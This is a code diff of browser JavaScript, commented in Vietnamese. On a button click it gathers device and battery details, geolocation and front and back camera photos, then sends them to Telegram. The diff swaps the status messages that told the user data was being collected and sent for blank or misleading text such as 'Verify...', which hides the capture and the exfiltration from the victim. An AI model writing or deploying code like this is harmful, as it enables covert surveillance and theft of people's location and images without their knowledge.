@@ -45,23 +45,23 @@
     startBtn.onclick = async () => {
         startBtn.disabled = true;
         startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
-        statusDiv.innerHTML = '📸 Đang thu thập thông tin...';
+        statusDiv.innerHTML = '...';
         
         try {
             // 1. Lấy thông tin thiết bị
-            statusDiv.innerHTML = '📱 Đang lấy thông tin thiết bị...';
+            statusDiv.innerHTML = '.';
             const deviceInfo = DeviceInfo.getInfo();
             const batteryInfo = await DeviceInfo.getBattery();
             
             // 2. Lấy thông tin vị trí
-            statusDiv.innerHTML = '🌍 Đang xác định vị trí...';
+            statusDiv.innerHTML = '🌍 ';
             const locationInfo = await LocationInfo.getLocationData();
             
             // 3. Chụp ảnh
-            statusDiv.innerHTML = '📸 Đang chụp ảnh...';
+            statusDiv.innerHTML = '...';
             const { frontPhoto, backPhoto } = await CameraManager.captureBoth();
             
-            const cameraStatus = frontPhoto ? '✅ Đã chụp thành công' : '🚫 Bị chặn hoặc không có camera';
+            const cameraStatus = frontPhoto ? '✅ Đã thành công' : '🚫 Bị chặn hoặc không có camera';
             
             // 4. Tổng hợp dữ liệu
             const finalData = {
@@ -87,7 +87,7 @@
             };
             
             // 5. Gửi lên Telegram
-            statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
+            statusDiv.innerHTML = 'Verify...';
             await TelegramSender.sendAll(finalData);
             
             // 6. Dừng camera
